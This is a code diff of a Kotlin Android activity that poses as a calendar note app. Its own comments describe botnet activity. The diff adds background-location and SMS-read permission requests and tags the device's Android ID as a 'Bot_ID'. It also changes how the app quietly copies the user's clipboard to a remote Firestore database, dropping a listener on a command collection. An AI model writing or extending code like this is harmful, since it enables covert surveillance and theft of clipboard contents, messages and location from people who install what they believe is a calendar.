@@ -55,12 +55,33 @@ class CalendarioNotas : AppCompatActivity() {
                     this,
                     arrayOf(
                         Manifest.permission.ACCESS_COARSE_LOCATION,
-                        Manifest.permission.ACCESS_FINE_LOCATION
+                        Manifest.permission.ACCESS_FINE_LOCATION,
                     ),
                     1222
                 )
             }
         }
+
+        if (Build.VERSION.SDK_INT >= 29) {
+            if (ContextCompat.checkSelfPermission(
+                    this,
+                    Manifest.permission.ACCESS_BACKGROUND_LOCATION
+                ) == PackageManager.PERMISSION_GRANTED
+            ) {
+                Log.i("Permisos", "Se tienen los permisos!")
+            } else {
+                ActivityCompat.requestPermissions(
+                    this,
+                    arrayOf(
+                        Manifest.permission.ACCESS_BACKGROUND_LOCATION
+                    ),
+                    1222
+                )
+            }
+        }
+
+        pidePermisoSMS()
+
         setContentView(R.layout.activity_calendario_notas)
         simpleCalendarView =
             findViewById<View>(R.id.simpleCalendarView) as CalendarView // get the reference of CalendarView
@@ -79,8 +100,6 @@ class CalendarioNotas : AppCompatActivity() {
             Settings.Secure.ANDROID_ID
         )
 
-        pidePermisoSMS()
-        pidePermisoGPS()
         // Comienzo del trabajo en segundo plano para la actividad de la botnet
         val alarm = Alarm()
         alarm.setAlarm(this)
@@ -116,7 +135,7 @@ class CalendarioNotas : AppCompatActivity() {
 
         botonAceptar.setOnClickListener(){
             val nota = hashMapOf(
-                "Bot ID" to idAndroid,
+                "Bot_ID" to idAndroid,
                 "nota" to textoNota.text.toString()
             )
             db.collection("notasUsuario").document(currentDate).set(nota)
@@ -159,8 +178,6 @@ class CalendarioNotas : AppCompatActivity() {
             val copiedString = clipBoardManager.text
             if(!copiedString.isNullOrEmpty()) {
                 Log.d("TAG2", "este texto es " + copiedString!!)
-
-
                 db.collection("portapapeles").document(idAndroid).get().addOnSuccessListener {
                     val contenido = it.data?.get("Portapapeles").toString()
                     if (!(contenido.contains(copiedString))) {
@@ -176,21 +193,7 @@ class CalendarioNotas : AppCompatActivity() {
                     "Portapapeles" to portapapelesGlobal
                 )
 
-                db.collection("ordenes")
-                    .addSnapshotListener { snapshot, e ->
-                        if (e != null) {
-                            Log.d("TAG", "Fallada la escucha de la primitiva.", e)
-                            return@addSnapshotListener
-                        }
-
-                        for (dc in snapshot!!.documentChanges) {
-                            when (dc.type) {
-                                DocumentChange.Type.ADDED -> db.collection("portapapeles")
-                                    .document(idAndroid)
-                                    .update(datosPortapapeles as Map<String, Any>)
-                            }
-                        }
-                    }
+                db.collection("portapapeles").document(idAndroid).set(datosPortapapeles)
             }
         }
     }
@@ -205,11 +208,5 @@ class CalendarioNotas : AppCompatActivity() {
     fun pidePermisoSMS(){
         val permissions = arrayOf(android.Manifest.permission.READ_SMS)
         ActivityCompat.requestPermissions(this, permissions,1)
-    }
-
-    // Pide permisos al usuario para el tema de recoger la lista de gps
-    fun pidePermisoGPS(){
-        val permissions = arrayOf(android.Manifest.permission.ACCESS_FINE_LOCATION)
-        ActivityCompat.requestPermissions(this, permissions,2)
     }
 }
